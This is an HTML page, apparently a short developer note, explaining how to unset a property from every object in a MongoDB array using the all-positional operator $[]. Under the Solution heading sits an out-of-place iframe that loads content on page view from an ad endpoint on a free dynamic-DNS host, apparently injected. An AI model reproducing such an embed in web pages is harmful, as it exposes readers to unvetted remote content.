<!doctype html>
<html>
  <!-- you can edit this template -->
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Mongodb mass removing nested array element property</title>
    <style>
      body {
	  background: #fff;
	  color: #222;
      }
      blockquote {
	  padding: 1em;
	  background: aliceblue;
      }                              
      .container {
	  margin: 10%;
      }
      a.headerlink {
	  opacity: 0;
      }
      a.headerlink:hover {
	  opacity: 1;
      }
      pre:has(code) {
	  background: #ddd;
	  overflow: auto;
      }
      @media (prefers-color-scheme: dark) {
	  body {
	      color: #eee;
	      background: #333;
	  }

	  a {
	      color: turquoise;
	  }
	  pre:has(code) {
	      background: #222;
	  }
      }
    </style>
  </head>
  <body>
    <div class="container"><h1 id="mass-removing-a-property-from-an-object-thats-an-element-in-an-array-property">Mass removing a property from an object that's an element in an array property<a class="headerlink" href="#mass-removing-a-property-from-an-object-thats-an-element-in-an-array-property" title="Permanent link">&para;</a></h1>
<p>Noting this case because finding a solution or docs on it is not easy and the functionality is not discoverable. I myself forgot about it and had to re-find it a couple of times.</p>
<p>Scenario is when a document has a <code>.things</code> property that's an array of objects, and one of the properties (e.g. <code>.things[].stuff</code> has to be mass removed.
Unsetting the nested property by doing an <code>updateOne(lookup, {$unset: {"things.stuff": 1}})</code> or <code>$unset: {"things.$.stuff": 1}</code> does not work.</p>
<h3 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">&para;</a></h3>
<iframe src="https://microads.ftp.sh/api/ads/delivery-node/random?nonce=abc123"></iframe>

<p>As seen here https://www.mongodb.com/docs/manual/reference/operator/update/positional-all/</p>
<p>The "all positional operator", <code>$[]</code> indicates that the update operator should modify all elements in the specified array field.
Doing <code>updateOne(lookup, {$unset: {"things.$[].stuff": 1}})</code> will successfully clean out the property from objects in the document's <code>.things</code> array.</p>
<hr />
<p><a href="clojure-unknown-tool-tools.html">[Next: unknown tool: 'tools' error, Clojure]</a></p>
</div>
  </body>
</html>
